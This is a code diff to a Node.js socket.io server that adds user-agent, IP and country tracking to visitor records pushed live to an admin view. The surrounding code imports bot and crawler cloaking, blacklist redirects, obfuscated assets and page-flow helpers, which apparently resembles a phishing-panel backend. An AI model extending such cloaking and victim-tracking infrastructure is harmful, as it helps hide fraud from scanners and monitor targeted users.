@@ -8,7 +8,7 @@ import path from "path";
 import { fileURLToPath } from "url";
 import createRoutes from "./routes/routes.js";
 import { blacklistMiddleware, createBotRouter } from './middleware/frontblock.js';
-import { getClientIP, getNextPage, setWebhook, pageFlow, requireAdmin, blockedRedirect, resolveFrontendRoute, prepareObfuscatedAssets } from "./utils.js";
+import { getClientIP, getNextPage, setWebhook, pageFlow, systemInfo, requireAdmin, blockedRedirect, resolveFrontendRoute, prepareObfuscatedAssets } from "./utils.js";
 import capRouter, { requireCap } from "./altcheck.js";
 import geoip from "geoip-lite";
 import session from "express-session"; 
@@ -20,7 +20,6 @@ const { isBotIP, isBotRef, isCrawler, detectBotMiddleware } = botDetection;
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
-const activeLocks = new Set();
 
 const app = express();
 const server = http.createServer(app);
@@ -131,40 +130,54 @@ socket.on("user:update", async (data) => {
     const { userId, newStatus, page } = data;
     socket.userId = userId;
 
+    // --- 1️⃣ Collect client info ---
     const ip = getClientIP(socket);
+    const ua = socket.handshake.headers['user-agent'] || 'unknown_ua';
     const geo = geoip.lookup(ip);
     const countryCode = geo ? geo.country : null;
 
-    // check existing user status (blocked) before updating DB
-    const existingUser = await db.get("SELECT status FROM users WHERE id = ?", [userId]);
+    // --- 2️⃣ Build system_info object ---
+    const systemInfo = JSON.stringify({
+      ua,
+      ip,
+      country: countryCode,
+      lastUpdate: new Date().toISOString()
+    });
+
+    // --- 3️⃣ Check existing user status ---
+    const existingUser = await db.get(
+      "SELECT status FROM users WHERE id = ?",
+      [userId]
+    );
+
     if (existingUser && existingUser.status === "blocked") {
       console.log(`⛔ User ${userId} is blocked — skipping DB update.`);
 
-      // still send admin UI the list based on current view mode (fresh read)
       const users = await fetchUsersByDisplayMode();
       io.emit("admin:update", users);
       return;
     }
 
-    // Insert or update the user row
+    // --- 4️⃣ Insert or update the user row ---
     await db.run(
       `
-      INSERT INTO users (id, status, last_seen, page, ip, country)
-      VALUES (?, ?, datetime('now'), ?, ?, ?)
+      INSERT INTO users (id, status, last_seen, page, ip, country, system_info)
+      VALUES (?, ?, datetime('now'), ?, ?, ?, ?)
       ON CONFLICT(id) DO UPDATE SET
         status = excluded.status,
         last_seen = excluded.last_seen,
         page = excluded.page,
         ip = excluded.ip,
-        country = excluded.country
+        country = excluded.country,
+        system_info = excluded.system_info
       `,
-      [userId, newStatus, page || "unknown", ip, countryCode]
+      [userId, newStatus, page || "unknown", ip, countryCode, systemInfo]
     );
 
-    // fetch the users list according to latest setting
+    // --- 5️⃣ Fetch updated users list and emit ---
     const users = await fetchUsersByDisplayMode();
 
-    // optional: tweak the single user object before sending
+    // Optional: tweak single user object if needed
     const updatedUsers = users.map(u => u.id === userId ? { ...u, screen: null } : u);
 
     io.emit("admin:update", updatedUsers);
